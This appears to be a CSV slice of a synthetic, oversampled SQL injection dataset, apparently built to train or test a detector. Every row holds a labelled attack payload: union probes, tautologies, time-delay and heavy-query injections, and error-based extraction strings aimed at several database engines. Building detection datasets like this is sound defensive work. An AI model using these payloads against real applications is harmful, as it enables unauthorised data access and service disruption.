id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000570,attack,other,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",nearest_attack_euclidean,R001857,0.29585820619339775
SMOTE_000571,attack,union,"-7255' union all select 2127,2127,2127,2127,2127#",nearest_attack_euclidean,R002661,0.28348188954139897
SMOTE_000572,attack,boolean,"1%' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R005803,0.2537394899952355
SMOTE_000573,attack,boolean,"1'  )   where 5317  =  5317 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R004881,0.08769108157921444
SMOTE_000574,attack,other,select   (  case when   (  9343  =  9513  )   then 1 else 9343*  (  select 9343 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R006049,0.004364751858426224
SMOTE_000575,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R002505,0.17436792940425686
SMOTE_000576,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R002569,0.22037230755113926
SMOTE_000577,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000745,0.047280840329655745
SMOTE_000578,attack,time,"1%""   )    )    and sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R006525,0.22154795370874028
SMOTE_000579,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",nearest_attack_euclidean,R001138,0.24721387277835596
SMOTE_000580,attack,boolean," select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",nearest_attack_euclidean,R000267,0.29988751778060513
SMOTE_000581,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%'  =  '",nearest_attack_euclidean,R008126,0.06813780463054099
SMOTE_000582,attack,boolean,"1'  )   where 2284  =  2284 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R007335,0.3073985720400681
SMOTE_000583,attack,boolean,"1'   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R005742,0.04700060099762491
SMOTE_000584,attack,boolean,"1%'   )    )    and elt  (  4483  =  5364,5364  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R007133,0.47614895011346536
SMOTE_000585,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'fnna'  =  'fnna",nearest_attack_euclidean,R007638,0.04408224624485422
SMOTE_000586,attack,time,1'  )   rlike sleep  (  5  ) ,nearest_attack_euclidean,R003858,0.21617546059435613
SMOTE_000587,attack,error,-4104%' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and '%'  =  ',nearest_attack_euclidean,R008757,0.13596769333257286
SMOTE_000588,attack,union,"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",nearest_attack_euclidean,R000903,0.276135649282085
SMOTE_000589,attack,boolean,-1499  )   as gxfm where 9762  =  9762 or 5989  =  4782--,nearest_attack_euclidean,R002673,0.17756030903934172
SMOTE_000590,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R002743,0.2654141863846128
SMOTE_000591,attack,boolean,"-4550""  )   as hlwe where 6026  =  6026 or   (  9364  =  9593  )  *9593--",nearest_attack_euclidean,R008884,0.282609127551664
SMOTE_000592,attack,union,"1%'  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R003675,0.01154289868070667
SMOTE_000593,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R006187,0.17116932319795694
SMOTE_000594,attack,other,select   (  case when   (  2132  =  8969  )   then 1 else 2132*  (  select 2132 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R005557,0.0
SMOTE_000595,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R003485,0.3915228778171861
SMOTE_000596,attack,other,1   )    )    as vcvn where 2106  =  2106,nearest_attack_euclidean,R006768,0.006090595475487641
SMOTE_000597,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R002860,0.28329130675238073
SMOTE_000598,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,nearest_attack_euclidean,R008947,0.7993981499408163
SMOTE_000599,attack,union,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",nearest_attack_euclidean,R003928,0.2403222324635778
SMOTE_000600,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000013,0.0
SMOTE_000601,attack,other,1 where 3354  =  3354,nearest_attack_euclidean,R001055,1.6858739404357614e-07
SMOTE_000602,attack,union,"-9347'  )   union all select 3884,3884#",nearest_attack_euclidean,R003103,0.014499821834061254
SMOTE_000603,attack,boolean,"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""dtwv"" like ""dtwv",nearest_attack_euclidean,R008784,0.157985017306606
SMOTE_000604,attack,boolean,"-2745'  )   or elt  (  1032  =  1032,3623  )   and   (  'vfxq'  =  'vfxq",nearest_attack_euclidean,R006581,0.020954410780192806
SMOTE_000605,attack,boolean,"1'  )   where 6274  =  6274 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006198,0.1362661028952777
SMOTE_000606,attack,other,1'||  (  select 'noik' from dual where 9851  =  9851,nearest_attack_euclidean,R001029,0.012875049558770045
SMOTE_000607,attack,union,"-7860'   )    )     )   union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",nearest_attack_euclidean,R001920,0.11095576267608001
SMOTE_000608,attack,boolean,"-3109"" or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R005715,0.203666693471633
SMOTE_000609,attack,error,"-7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo",nearest_attack_euclidean,R002853,0.07930426825962293
SMOTE_000610,attack,union,"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",nearest_attack_euclidean,R006242,0.38965230420988417
SMOTE_000611,attack,boolean,"-8472'  )   where 3340  =  3340 or make_set  (  1752  =  9905,9905  )  --",nearest_attack_euclidean,R002409,0.2622928225869609
SMOTE_000612,attack,boolean,"1'  )   as jwvp where 5231  =  5231 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R005298,0.12057798530444833
SMOTE_000613,attack,boolean,"1  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R007556,0.049911354062056795
SMOTE_000614,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mexd' like 'mexd",nearest_attack_euclidean,R004671,0.026847772556611423
SMOTE_000615,attack,union,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",nearest_attack_euclidean,R003218,0.5723198336088954
SMOTE_000616,attack,boolean,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,nearest_attack_euclidean,R000110,0.13561820506396421
SMOTE_000617,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R003799,0.3886097545353109
SMOTE_000618,attack,other,select   (  case when   (  9030  =  6952  )   then 1 else 9030*  (  select 9030 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R006588,0.009914555564841852
SMOTE_000619,attack,boolean,"1%""   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R007242,0.3674873341343579
SMOTE_000620,attack,boolean,"1' where 1895  =  1895 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R006856,0.06961125329368054
SMOTE_000621,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R005134,0.4828180205987901
SMOTE_000622,attack,time,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',nearest_attack_euclidean,R000992,0.8714642593488613
SMOTE_000623,attack,union,"1  )   where 4810  =  4810 union all select null,null#",nearest_attack_euclidean,R004235,0.2579656347638896
SMOTE_000624,attack,other,"  (  select * from generate_series  (  4990,4990,case when   (  4990  =  5065  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R001726,0.21255976810794053
SMOTE_000625,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R002168,3.371747880871523e-07
SMOTE_000626,attack,other,1 rlike   (  select   (  case when   (  8911  =  5301  )   then 1 else 0x28 end   )    )   # pmuh,nearest_attack_euclidean,R006630,0.6138292733705555
SMOTE_000627,attack,boolean,1 and 9412  =  6877#,nearest_attack_euclidean,R002883,1.2067733682229407
SMOTE_000628,attack,boolean,1'   )    )    as qovd where 8865  =  8865 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R008846,0.20266533394697242
SMOTE_000629,attack,other,&',nearest_attack_euclidean,R000323,0.5868268850081315
SMOTE_000630,attack,boolean,"1""   )    )    and 9800  =  8713",nearest_attack_euclidean,R004293,0.5884535806023399
SMOTE_000631,attack,other,"select * from generate_series  (  5846,5846,case when   (  5846  =  5227  )   then 1 else 0 end  )   limit 1--",nearest_attack_euclidean,R003506,0.003443987659165856
SMOTE_000632,attack,union," select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",nearest_attack_euclidean,R000540,0.10737884908566767
SMOTE_000633,attack,boolean,1 where 8102  =  8102 and 9198  =  9198--,nearest_attack_euclidean,R003537,0.11955615264894301
SMOTE_000634,attack,union,"-4136'   )    )    as cczp where 7052  =  7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",nearest_attack_euclidean,R003577,0.1671266359263533
SMOTE_000635,attack,error,"1'||  (  select 'bpml' where 7360  =  7360 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R001108,0.32937617737014235
SMOTE_000636,attack,boolean,1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,nearest_attack_euclidean,R004597,0.11300344565764799
SMOTE_000637,attack,boolean,"-8777""  )   as lalf where 8606  =  8606 or elt  (  4397  =  5823,5823  )  --",nearest_attack_euclidean,R001759,0.4001616852390347
SMOTE_000638,attack,union,"1 where 9869  =  9869 union all select null,null#",nearest_attack_euclidean,R007502,0.2670795006706347
SMOTE_000639,attack,union,"1""  )   as xsgx where 5239  =  5239 union all select null,null--",nearest_attack_euclidean,R005186,0.2566289524009811
SMOTE_000640,attack,error,1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'ixzr'  =  'ixzr,nearest_attack_euclidean,R003028,0.043335466933414286
SMOTE_000641,attack,union,"-5744  )   union all select 3617,3617,3617,3617,3617,3617--",nearest_attack_euclidean,R002783,0.25410615580147944
SMOTE_000642,attack,boolean,1'||  (  select 'vasx' where 4770  =  4770 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',nearest_attack_euclidean,R005626,0.07132289352951353
SMOTE_000643,attack,boolean,"-6626%""  )   or 1744  =  5292 and   (  ""%""  =  """,nearest_attack_euclidean,R002298,0.1388300294232621
SMOTE_000644,attack,boolean,"1'  )   as mgko where 1828  =  1828 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R007010,0.2434001280582727
SMOTE_000645,attack,boolean,1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'cuav'  =  'cuav,nearest_attack_euclidean,R007049,0.7010058549718968
SMOTE_000646,attack,other,end#,nearest_attack_euclidean,R007339,0.7266854252453133
SMOTE_000647,attack,boolean,"1'   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R005742,0.6860833602600653
SMOTE_000648,attack,boolean,"1  )   and make_set  (  8403  =  8403,8899  )  ",nearest_attack_euclidean,R008076,0.035893844974246684
SMOTE_000649,attack,time,select pg_sleep  (  5   )    )   +',nearest_attack_euclidean,R008468,0.7682804721785966
SMOTE_000650,attack,boolean,"1""   )    )    and elt  (  3785  =  9386,9386  )   and    (    (   ""inwa"" like ""inwa",nearest_attack_euclidean,R006766,0.2925228693492088
SMOTE_000651,attack,error,"1 where 2278  =  2278 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R007831,1.1248172959059781
SMOTE_000652,attack,error,"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""ureu"" like ""ureu",nearest_attack_euclidean,R006579,0.08219055772631716
SMOTE_000653,attack,boolean," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000022,0.0
SMOTE_000654,attack,union,"-2230%"" union all select 3303,3303,3303--",nearest_attack_euclidean,R004772,0.16695728413978772
SMOTE_000655,attack,boolean,-3431%'  )   or 9323  =  9323#,nearest_attack_euclidean,R001188,0.22805256873242477
SMOTE_000656,attack,boolean,"1'  )   where 3255  =  3255 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R007841,0.07451895974385016
SMOTE_000657,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000072,0.19962749378710815
SMOTE_000658,attack,union,"1' where 7104  =  7104 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000857,0.025567495603361468
